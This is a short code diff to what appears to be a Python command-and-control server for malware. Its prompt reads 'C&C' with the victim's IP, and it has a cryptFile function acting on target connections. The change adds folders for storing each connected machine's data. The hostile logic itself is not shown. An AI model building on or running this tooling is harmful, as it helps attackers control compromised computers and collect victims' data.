@@ -522,6 +522,8 @@ def cryptFile(targetConn, command):
 
 
 def mainFunctions(ip, targetConn, ses):
+    if not os.path.exists(f"./DATA/{ip[0]}"):
+        os.makedirs(f"./DATA/{ip[0]}")
     try:
         cachedCommands = {'commands': {}}
         prompt = f"{Y}<*{R} C&C {Y}* {ip[0]}>: {END} "
@@ -641,6 +643,8 @@ def server(serverSock):
 
 
 if __name__ == "__main__":
+    if not os.path.exists("./DATA"):
+        os.makedirs("./DATA")
     print(f"{Y}[!>] {R}Waiting For incoming Conections...{END}")
     serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     serverSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
